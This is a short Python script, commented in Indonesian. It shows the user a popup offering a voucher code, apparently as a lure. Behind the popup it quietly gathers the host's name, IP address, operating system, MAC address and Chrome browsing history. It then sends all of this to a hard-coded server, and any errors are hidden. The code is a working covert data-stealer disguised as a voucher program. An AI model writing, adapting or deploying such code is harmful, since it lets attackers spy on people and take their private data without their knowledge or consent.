import socket
import time
import json
import requests
import platform
import uuid
import tkinter as tk
from tkinter import messagebox
from browser_utils import get_chrome_history

SERVER_URL = "http://192.168.20.12:5000/report"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except:
        ip = "0.0.0.0"
    return ip

def get_basic_info():
    return {
        "hostname": socket.gethostname(),
        "ip_address": get_ip(),
        "os": platform.system(),
        "os_version": platform.version(),
        "mac": hex(uuid.getnode()),
        "browser_history": get_chrome_history()
    }

# Tampilkan pesan ke pengguna
def show_message():
    root = tk.Tk()
    root.withdraw()  # Menyembunyikan jendela utama
    messagebox.showinfo("Code Voucher Anda", "\nRKS208-01-1jam")

# Eksekusi
try:
    show_message()
    data = get_basic_info()
    requests.post(SERVER_URL, json=data)
except Exception as e:
    pass 
